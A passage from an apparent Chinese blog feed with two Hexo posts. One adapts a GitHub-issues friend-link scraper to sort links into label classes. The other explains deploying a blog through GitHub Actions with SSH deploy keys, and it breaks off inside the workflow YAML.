class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 网络请求设置</span><br><span class="line">request:</span><br><span class="line">  timeout: 10 # 超时设置</span><br><span class="line">  ssl: false # ssl设置</span><br><span class="line"></span><br><span class="line"># 要抓取的 issues 配置</span><br><span class="line">issues:</span><br><span class="line">  repo: felixchen0707/friendLink_api # 仓库持有者/仓库名</span><br><span class="line">  label: active # 筛选具有 active 标签的 issue ，取消此项则会提取所有 open 状态的 issue</span><br><span class="line"><span class="addition">+ className:</span></span><br><span class="line"><span class="addition">+   - &#x27;ordinary&#x27;</span></span><br><span class="line"><span class="addition">+   - &#x27;top&#x27;</span></span><br><span class="line">  sort: updated-desc # 排序，按最近更新，取消此项则按创建时间排序</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tab_2-2"><figure class="highlight yaml"><figcaption><span>config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 网络请求设置</span></span><br><span class="line"><span class="attr">request:</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="number">10</span> <span class="comment"># 超时设置</span></span><br><span class="line">  <span class="attr">ssl:</span> <span class="literal">false</span> <span class="comment"># ssl设置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要抓取的 issues 配置</span></span><br><span class="line"><span class="attr">issues:</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">felixchen0707/friendLink_api</span> <span class="comment"># 仓库持有者/仓库名</span></span><br><span class="line">  <span class="attr">label:</span> <span class="string">active</span> <span class="comment"># 筛选具有 active 标签的 issue ，取消此项则会提取所有 open 状态的 issue</span></span><br><span class="line">  <span class="attr">className:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;ordinary&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;top&#x27;</span></span><br><span class="line">  <span class="attr">sort:</span> <span class="string">updated-desc</span> <span class="comment"># 排序，按最近更新，取消此项则按创建时间排序</span></span><br></pre></td></tr></table></figure></div></div></div><h2 id="generatormainpy"><a class="markdownIt-Anchor" href="#generatormainpy"></a> generator/main.py</h2><div class="tag-plugin tabs"id="tab_3"><div class="nav-tabs"><div class="tab active"><a href="#tab_3-1">diff</a></div><div class="tab"><a href="#tab_3-2">源文件</a></div></div><div class="tab-content"><div class="tab-pane active" id="tab_3-1"><figure class="highlight diff"><figcaption><span>generator/main.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># author: https://github.com/Zfour</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import os</span><br><span class="line">import request</span><br><span class="line">import json</span><br><span class="line">import config</span><br><span class="line"></span><br><span class="line">version = &#x27;v2&#x27;</span><br><span class="line">outputdir = version  # 输出文件结构变化时，更新输出路径版本</span><br><span class="line"><span class="deletion">- filename = &#x27;data.json&#x27;</span></span><br><span class="line"></span><br><span class="line">data_pool = []</span><br><span class="line"></span><br><span class="line"><span class="addition">+ cfg = config.load()</span></span><br><span class="line"><span class="addition">+ filter = cfg[&#x27;issues&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mkdir(path):</span><br><span class="line">    folder = os.path.exists(path)</span><br><span class="line">    if not folder:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">        print(&quot;create dir:&quot;, path)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;dir exists:&quot;, path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="deletion">- def github_issuse(data_pool):</span></span><br><span class="line"><span class="addition">+ def github_issuse(data_pool, className):</span></span><br><span class="line">    print(&#x27;\n&#x27;)</span><br><span class="line">    print(&#x27;------- github issues start ----------&#x27;)</span><br><span class="line"><span class="addition">+   print(&#x27;is catching label:&#x27; + className)</span></span><br><span class="line">    baselink = &#x27;https://github.com/&#x27;</span><br><span class="line"><span class="deletion">-   cfg = config.load()</span></span><br><span class="line"><span class="deletion">-   filter = cfg[&#x27;issues&#x27;]</span></span><br><span class="line">    try:</span><br><span class="line">        for number in range(1, 100):</span><br><span class="line">            print(&#x27;page:&#x27;, number)</span><br><span class="line">            url = &#x27;https://github.com/&#x27; + filter[&#x27;repo&#x27;] + &#x27;/issues?page=&#x27; + str(number) + &#x27;&amp;q=is%3Aopen&#x27;</span><br><span class="line">            if filter[&#x27;label&#x27;]:</span><br><span class="line"><span class="deletion">-           url = url + &#x27;+label%3A&#x27; + filter[&#x27;label&#x27;]</span></span><br><span class="line"><span class="addition">+           url = url + &#x27;+label%3A&#x27; + filter[&#x27;label&#x27;] + &#x27;+label%3A&#x27; + className</span></span><br><span class="line">            if filter[&#x27;sort&#x27;]:</span><br><span class="line">                url = url + &#x27;+sort%3A&#x27; + filter[&#x27;sort&#x27;]</span><br><span class="line">            print(&#x27;parse:&#x27;, url)</span><br><span class="line">            github = request.get_data(url)</span><br><span class="line">            soup = BeautifulSoup(github, &#x27;html.parser&#x27;)</span><br><span class="line">            main_content = soup.find_all(&#x27;div&#x27;, &#123;&#x27;aria-label&#x27;: &#x27;Issues&#x27;&#125;)</span><br><span class="line">            linklist = main_content[0].find_all(&#x27;a&#x27;, &#123;&#x27;class&#x27;: &#x27;Link--primary&#x27;&#125;)</span><br><span class="line">            if len(linklist) == 0:</span><br><span class="line">                print(&#x27;&gt; end&#x27;)</span><br><span class="line">                break</span><br><span class="line">            for item in linklist:</span><br><span class="line">                issueslink = baselink + item[&#x27;href&#x27;]</span><br><span class="line">                issues_page = request.get_data(issueslink)</span><br><span class="line">                issues_soup = BeautifulSoup(issues_page, &#x27;html.parser&#x27;)</span><br><span class="line">                try:</span><br><span class="line">                    issues_linklist = issues_soup.find_all(&#x27;pre&#x27;)</span><br><span class="line">                    source = issues_linklist[0].text</span><br><span class="line">                    if &quot;&#123;&quot; in source:</span><br><span class="line">                        source = json.loads(source)</span><br><span class="line">                        print(source)</span><br><span class="line">                        data_pool.append(source)</span><br><span class="line">                except:</span><br><span class="line">                    continue</span><br><span class="line">    except Exception as e:</span><br><span class="line"><span class="deletion">-       print(&#x27;&gt; end&#x27;)</span></span><br><span class="line"><span class="addition">+       print(&#x27;&gt; end catching label:&#x27; + className)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&#x27;------- github issues end ----------&#x27;)</span><br><span class="line">print(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"># 友链规则</span><br><span class="line"><span class="addition">+ for className in filter[&#x27;className&#x27;]:</span></span><br><span class="line"><span class="addition">+   data_pool.clear()</span></span><br><span class="line"><span class="deletion">-   github_issuse(data_pool=data_pool)</span></span><br><span class="line"><span class="addition">+   github_issuse(data_pool=data_pool, className=className)</span></span><br><span class="line">    mkdir(outputdir)</span><br><span class="line"><span class="deletion">-   full_path = outputdir + &#x27;/&#x27; + filename</span></span><br><span class="line"><span class="addition">+   full_path = outputdir + &#x27;/&#x27; + className + &#x27;.json&#x27;</span></span><br><span class="line">    with open(full_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file_obj:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;version&#x27;: version,</span><br><span class="line">            &#x27;content&#x27;: data_pool</span><br><span class="line">        &#125;</span><br><span class="line">        json.dump(data, file_obj, ensure_ascii=False, indent=2)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tab_3-2"><figure class="highlight python"><figcaption><span>generator/main.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: https://github.com/Zfour</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">version = <span class="string">&#x27;v2&#x27;</span></span><br><span class="line">outputdir = version  <span class="comment"># 输出文件结构变化时，更新输出路径版本</span></span><br><span class="line"></span><br><span class="line">data_pool = []</span><br><span class="line"></span><br><span class="line">cfg = config.load()</span><br><span class="line"><span class="built_in">filter</span> = cfg[<span class="string">&#x27;issues&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir</span>(<span class="params">path</span>):</span><br><span class="line">    folder = os.path.exists(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> folder:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;create dir:&quot;</span>, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;dir exists:&quot;</span>, path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">github_issuse</span>(<span class="params">data_pool, className</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------- github issues start ----------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;is catching label:&#x27;</span> + className)</span><br><span class="line">    baselink = <span class="string">&#x27;https://github.com/&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;page:&#x27;</span>, number)</span><br><span class="line">            url = <span class="string">&#x27;https://github.com/&#x27;</span> + <span class="built_in">filter</span>[<span class="string">&#x27;repo&#x27;</span>] + <span class="string">&#x27;/issues?page=&#x27;</span> + <span class="built_in">str</span>(number) + <span class="string">&#x27;&amp;q=is%3Aopen&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">filter</span>[<span class="string">&#x27;label&#x27;</span>]:</span><br><span class="line">                url = url + <span class="string">&#x27;+label%3A&#x27;</span> + <span class="built_in">filter</span>[<span class="string">&#x27;label&#x27;</span>] + <span class="string">&#x27;+label%3A&#x27;</span> + className</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">filter</span>[<span class="string">&#x27;sort&#x27;</span>]:</span><br><span class="line">                url = url + <span class="string">&#x27;+sort%3A&#x27;</span> + <span class="built_in">filter</span>[<span class="string">&#x27;sort&#x27;</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;parse:&#x27;</span>, url)</span><br><span class="line">            github = request.get_data(url)</span><br><span class="line">            soup = BeautifulSoup(github, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            main_content = soup.find_all(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;aria-label&#x27;</span>: <span class="string">&#x27;Issues&#x27;</span>&#125;)</span><br><span class="line">            linklist = main_content[<span class="number">0</span>].find_all(<span class="string">&#x27;a&#x27;</span>, &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;Link--primary&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(linklist) == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&gt; end&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> linklist:</span><br><span class="line">                issueslink = baselink + item[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">                issues_page = request.get_data(issueslink)</span><br><span class="line">                issues_soup = BeautifulSoup(issues_page, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    issues_linklist = issues_soup.find_all(<span class="string">&#x27;pre&#x27;</span>)</span><br><span class="line">                    source = issues_linklist[<span class="number">0</span>].text</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> source:</span><br><span class="line">                        source = json.loads(source)</span><br><span class="line">                        <span class="built_in">print</span>(source)</span><br><span class="line">                        data_pool.append(source)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&gt; end catching label:&#x27;</span> + className)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------- github issues end ----------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 友链规则</span></span><br><span class="line"><span class="keyword">for</span> className <span class="keyword">in</span> <span class="built_in">filter</span>[<span class="string">&#x27;className&#x27;</span>]:</span><br><span class="line">    data_pool.clear()</span><br><span class="line">    github_issuse(data_pool=data_pool, className=className)</span><br><span class="line">    mkdir(outputdir)</span><br><span class="line">    full_path = outputdir + <span class="string">&#x27;/&#x27;</span> + className + <span class="string">&#x27;.json&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(full_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;version&#x27;</span>: version,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>: data_pool</span><br><span class="line">        &#125;</span><br><span class="line">        json.dump(data, file_obj, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div></div></div><h1 id="如何配置classname"><a class="markdownIt-Anchor" href="#如何配置classname"></a> 如何配置className</h1><p>在我的构想中，一个网站应该由两部分构成：<strong>网站状态</strong>和<strong>网站分类</strong>。前者通过<code>active</code>、<code>404</code>、<code>suspend</code>这类的label进行标记；后者则是你自定义的分类。</p><p>对于你自定义的分类名称，你需要写在<code>config.yml</code>中的<code>className</code>项中，例如我这里用<code>ordinary</code>和<code>top</code>来区分一般友链和置顶友链。经过配置后的<code>className</code>包含的元素会在执行action的时候依次被作为label<strong>单独抓取</strong>合适的友链，例如下图是我的友链仓库：</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/11/13/teJUg.png" alt="我的友链仓库" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">我的友链仓库</span></div></div><p>其中，标记为<code>active</code>的issue表示允许被抓取，而标记为<code>top</code>和<code>ordinary</code>的issue会在抓取<code>top</code>和<code>ordinary</code>的两批抓取中分别被抓取，来达到对友链分类的效果。</p><h1 id="期望的运行结果"><a class="markdownIt-Anchor" href="#期望的运行结果"></a> 期望的运行结果</h1><p>被标记为<code>classA</code>的友链将会输出至<code>output</code>分支下<code>v2/classA.json</code>文件中，其他情况类似。由于label的名字与输出文件的名字强相关，这也要求你<strong>不要用奇怪的符号作为label的内容</strong>。</p><h1 id="一些些补充"><a class="markdownIt-Anchor" href="#一些些补充"></a> 一些些补充</h1><h2 id="每个issue对应两个label"><a class="markdownIt-Anchor" href="#每个issue对应两个label"></a> 每个issue对应两个label</h2><p>由于我使用<strong>站点状态</strong>和<strong>站点分类</strong>来分别表示一个网站，因此每一个issue至少都有两个label标记。例如，你的<code>config.yml</code>中配置了：</p><figure class="highlight yaml"><figcaption><span>config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">issues:</span></span><br><span class="line">    <span class="attr">label:</span> <span class="string">active</span></span><br></pre></td></tr></table></figure><p>若你仅仅为一个issue打上了<code>ordinary</code>标记而没有加上<code>active</code>标记或者反之，则该issue都不会被读取到。</p><h2 id="加快访问速度"><a class="markdownIt-Anchor" href="#加快访问速度"></a> 加快访问速度</h2><p>由于直接访问github的速度极慢，你可以使用Vercel构建该仓库来达到加速访问的效果。在你的Vercel的面板界面(dashboard)新建项目，导入你的友链数据仓库并点击deploy。<strong>由于你的输出内容一般不在<code>main</code>分支但是Vercel却会默认构建<code>main</code>分支，你需要进行以下操作</strong>：</p><p>点开项目，进入<code>Settings-&gt;Git</code>界面，找到<code>Production Branch</code>配置项，将分支名称从<code>main/master</code>改成<code>output</code>。下次向<code>output</code>分支推送时，Vercel就会重新改为部署该分支了。</p><h1 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h1><ul><li><a href="https://github.com/xaoxuu/issues-json-generator">xaoxuu/issues-json-generator</a></li><li><a href="https://blog.beacox.space/">BeaCox</a>的灵感</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;我们时常希望博客的友链界面能够对不同的友链分组；stellar的动态友链功能又十分强大，但所有导出的数据都会写入一个文件。这篇文章记录对动态友链生成仓库的改造，使之能够进行友链分类。&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="https://blog.snowflake.zone/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="博客" scheme="https://blog.snowflake.zone/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>利用Github Action部署博客</title>
    <link href="https://blog.snowflake.zone/posts/16/"/>
    <id>https://blog.snowflake.zone/posts/16/</id>
    <published>2022-11-10T14:47:21.000Z</published>
    <updated>2022-11-09T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>刚开始建立博客的时候，我一直采取的是本地<code>hexo g</code>后<code>hexo d</code>推送到Github的仓库中。这是利用hexo搭建博客最简单的部署方式。然后后续发现，源文件在这种情况下很容易丢失，备份的话又显得比较麻烦。后来了解到Github Action的强大功能，加上阅读了<a href="https://sanonz.github.io/2020/deploy-a-hexo-blog-from-github-actions/">这篇</a>教程后，现在已经实现将源文件推送到某个Github仓库，而后由仓库自动执行Github Action推送静态文件到另一个仓库(一般是我们的<code>.github.io</code>仓库)来代替我们在本地完成<code>hexo g -d</code>操作，同时也能托管我们的源文件。由于上面那篇教程年代有些许久远，这篇文章主要提供能够直接抄作业的workflow供大家使用。</p><h1 id="操作步骤"><a class="markdownIt-Anchor" href="#操作步骤"></a> 操作步骤</h1><h2 id="创建需要用到的仓库"><a class="markdownIt-Anchor" href="#创建需要用到的仓库"></a> 创建需要用到的仓库</h2><p>首先需要创建两个仓库，一个用于存放源文件，另一个存放生成的静态文件。以我的为例，用<code>felixchen0707/MyBlogSourceCode</code>存放源文件，用<code>felixchen0707/MyBlog</code>存放静态文件。</p><div class="tag-plugin colorful note" color="yellow"><div class="title">提醒</div><div class="body"><p>值得注意的是，你也可以在同一个仓库中创建两个分支，在两个分支中分别存放源文件和静态文件。但并不推荐这么做，因为若这样做，也就意味着你的源文件和静态文件只能同时为public或者private，而且github仓库数目也并没有那么紧张，分开存放利远大于弊。</p></div></div><h2 id="生成密钥"><a class="markdownIt-Anchor" href="#生成密钥"></a> 生成密钥</h2><p>由于对仓库的写入需要特别的权限，因此你需要生成密钥对。在bash键入如下命令：</p><div class="tag-plugin copy"><input class="copy-area" id="copy_12" value="ssh-keygen -f github-deploy-key"><button class="copy-btn" onclick="util.copy(&quot;copy_12&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>你可以在当前文件夹下看到两个文件，分别为<code>github-deploy-key</code>和<code>github-deploy-key.pub</code>，前者为私钥，后者为公钥。</p><div class="tag-plugin colorful note" color="yellow"><div class="title">注意</div><div class="body"><p>请务必保证私钥的保密性。</p></div></div><h2 id="为仓库配置公钥和私钥"><a class="markdownIt-Anchor" href="#为仓库配置公钥和私钥"></a> 为仓库配置公钥和私钥</h2><h3 id="源文件仓库"><a class="markdownIt-Anchor" href="#源文件仓库"></a> 源文件仓库</h3><p>首先前往源文件仓库配置<strong>私钥</strong>。在我提供的例子中，其为<code>felixchen0707/MyBlogSourceCode</code>。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/11/10/tkJwr.png" alt="源代码仓库" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">源代码仓库</span></div></div><p>如上图所示，为其新建一个<code>secret</code>，名称为<code>HEXO_DEPLOY_PRI</code>，内容为<code>github-deploy-key</code>文件中的全部内容(全选<kbd>Ctrl</kbd>+<kbd>A</kbd>)。</p><h3 id="静态文件仓库"><a class="markdownIt-Anchor" href="#静态文件仓库"></a> 静态文件仓库</h3><p>然后，前往静态文件仓库配置<strong>公钥</strong>。在我提供的例子中，为<code>felixchen0707/MyBlog</code>。</p><div class="tag-plugin colorful note" color="yellow"><div class="title">注意</div><div class="body"><p>如果使用Github Pages托管可供访问的网站，这个仓库必须是<code>你的用户名.github.io</code>，以我为例，即<code>felixchen0707.github.io</code>。</p></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/11/10/tkR1M.png" alt="静态文件仓库" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">静态文件仓库</span></div></div><p>如上图所示，添加<code>Deploy Keys</code>。<code>Title</code>为<code>HEXO_DEPLOY_PUB</code>，内容为文件<code>github-deploy-key.pub</code>的<strong>全部内容</strong>。<strong>同时，勾选下方的<code>Allow Write Access</code>来提供写入权限</strong>。若你没有勾选此选项，该密钥对没有写的权限。</p><div class="tag-plugin colorful note" color="yellow"><div class="title">注意</div><div class="body"><p>这里添加的是<code>Deploy Keys</code>而非<code>Secrets</code>，一定不要搞错。</p></div></div><h2 id="添加workflow"><a class="markdownIt-Anchor" href="#添加workflow"></a> 添加Workflow</h2><h3 id="workflow模板"><a class="markdownIt-Anchor" href="#workflow模板"></a> workflow模板</h3><p>接下来，在你的博客根目录下新建一个文件夹，名为<code>.github</code>，其中存放的文件可以被github识别并且加以利用。新建<code>.github/workflows/auto_deploy.yml</code>编写workflow模板。其内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /.github/workflows/auto_deploy.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">name:</span> <span class="string">CI</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">GIT_USER:</span> <span class="string">felixchen0707</span></span><br><span class="line">  <span class="attr">GIT_EMAIL:</span> <span class="number">3137181992</span><span class="string">@qq.com</span></span><br><span class="line">  <span class="attr">THEME_REPO:</span> <span class="string">felixchen0707/hexo-theme-stellar</span></span><br><span class="line">  <span class="attr">THEME_BRANCH:</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">DEPLOY_REPO:</span> <span class="string">felixchen0707/MyBlog</span></span><br><span class="line">  <span class="attr">DEPLOY_BRANCH:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Build</span> <span class="string">on</span> <span class="string">node</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node_version</span> <span class="string">&#125;&#125;</span> <span class="string">and</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.os</span> <span 